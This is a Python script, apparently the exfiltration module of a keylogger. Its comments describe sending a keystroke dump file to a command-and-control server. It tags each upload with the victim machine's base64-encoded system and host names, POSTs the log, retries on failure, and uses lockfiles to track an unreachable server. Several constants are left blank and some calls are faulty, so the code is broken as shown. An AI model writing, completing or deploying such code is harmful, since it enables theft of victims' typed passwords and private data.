import os
import pathlib
import sys
import base64
import requests
from requests import api
from pathlib import Path
logfile = ''
##Keylog dumpfile
c2_url = ''
##C2 to listen for the dump files
blocked = False
##Lockfiles are set for sessions persistent configs
WINDOWS_LOCKFILE =
LINUX_LOCKFILE = 

if __name__ == "__main__":
	##OS Name code indicates correct path of dumpfile
	if(os.name == 'nt'):
		logpath = pathlib.WindowsPath(logfile)
		if(os.path.exists(WINDOWS_LOCKFILE) == True):
			blocked = True
	if(os.name == 'posix'):
		logpath = pathlib.PosixPath(logfile)
		if(os.path.exists(LINUX_LOCKFILE) == True):
			blocked = True
	##check if enpoint is live after last connection failed
	if(blocked == True):
		checked = requests.request('HEAD',
					   c2_url,)
		if(checked.status_code == 200):
			blocked = False
	if(logpath.is_file() == False):
		sys.exit()
	##Creates Headers for endpoint identification
	header_assembly = { b'sn': base64.b64encode(bytes(os.uname().sysname,encoding='utf-8')),
			    b'nn': base64.b64encode(bytes(os.uname().nodename,encoding='utf-8'))}

	##Actually Send the request
	requests_obj = requests.request('POST',
					c2_url,
					headers=header_assembly,
					files={'bbe02f946d5455d74616fc9777557c22': open(logfile, 'r')})

	if(requests_obj.status_code == 200):
		sys.exit()
	elif(requests_obj.status_code >= 300):
		sys.exit() ##to be changed
	else:
		##Error Handling Here Means that request is a status Code 400 or higher
		try:
			#Resend Request
			requests_obj = requests.request('POST',
							c2_url,
							headers=header_assembly,
							files={'bbe02f946d5455d74616fc9777557c22':open(logfile, 'r')})
		except requests.exceptions.ConnectTimeout:
			if(os.name == 'nt'):
				Path(WINDOWS_LOCKFILE).touch
			elif(os.name == 'posix'):
				Path(LINUX_LOCKFILE).touch
		finally:
			sys.exit()
